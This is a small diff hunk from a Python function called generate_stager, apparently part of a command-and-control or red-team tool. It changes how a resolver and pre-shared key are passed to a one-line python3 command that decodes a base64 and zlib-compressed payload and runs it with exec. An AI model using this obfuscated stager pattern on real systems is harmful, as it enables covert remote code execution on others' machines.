@@ -85,7 +85,7 @@ def generate_stager(config, template, client_publish_item, target_os):
         "python3 -c "
         '"import base64,zlib;'
         "exec(zlib.decompress(base64.b64decode('%s')))\""
-        " RESOLVER PSK"
+        " --resolver RESOLVER --psk PSK"
         % payload_str
     )
 
